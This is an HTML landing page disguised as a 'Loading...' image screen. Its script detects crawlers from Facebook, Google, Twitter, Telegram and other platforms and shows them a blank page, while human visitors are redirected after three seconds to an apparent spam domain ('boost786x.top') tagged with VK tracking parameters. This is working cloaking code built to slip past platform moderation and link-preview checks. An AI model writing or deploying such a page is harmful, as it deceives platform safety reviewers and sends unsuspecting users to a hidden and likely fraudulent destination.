<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Loading...</title>

  <!-- Facebook / Bots Meta -->
  <meta property="og:image" content="">
  <meta property="og:image:width" content="0">
  <meta property="og:image:height" content="0">
  <meta property="og:image:type" content="">
  <meta name="twitter:image" content="">
  <meta name="twitter:card" content="summary">
  <meta name="robots" content="noimageindex, noarchive, nosnippet, nofollow">
  <meta name="googlebot" content="noimageindex, nofollow">

  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: #000;
      height: 100vh;
      width: 100vw;
      overflow: hidden;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: Arial, sans-serif;
    }
    #main-image {
      width: 100vw;
      height: 100vh;
      object-fit: cover;
      cursor: pointer;
      display: none;
    }
    .loading {
      color: #fff;
      font-size: 18px;
    }
  </style>
</head>
<body>

  <img id="main-image" alt="" onclick="goToTarget()">
  <div class="loading" id="loading-text">Loading...</div>

<script>
/* CONFIGURATION */
const CONFIG = {
  targetLink: "https://boost786x.top/boost55abc/?utm_source=B.VK&utm_medium=VK",
  userImage: "image_03.webp"
};

/* BOT DETECTION */
function isFacebookOrBot() {
  const ua = navigator.userAgent.toLowerCase();
  const bots = [
    "facebookexternalhit", "facebot", "facebook", "facebookcatalog",
    "meta-externalagent", "meta-externalads", "twitterbot", "linkedinbot",
    "slackbot", "whatsapp", "discordbot", "telegrambot", "googlebot",
    "bingbot", "yandex", "baiduspider", "duckduckbot", "applebot",
    "semrush", "ahrefs", "mj12bot", "dotbot", "petalbot", "bytespider"
  ];
  return bots.some(bot => ua.includes(bot));
}

/* MAIN LOGIC */
(function () {
  if (isFacebookOrBot()) {
    document.getElementById("loading-text").style.display = "none";
    document.title = "";
    document.body.innerHTML = "";
    return;
  }

  // Show image and set auto-redirect timer (3 seconds)
  showImageScreen();
  setTimeout(goToTarget, 3000);
})();

function showImageScreen() {
  const img = document.getElementById("main-image");
  img.src = CONFIG.userImage;
  img.style.display = "block";
  document.getElementById("loading-text").style.display = "none";
}

function goToTarget() {
  window.location.href = CONFIG.targetLink;
}
</script>

</body>
</html>
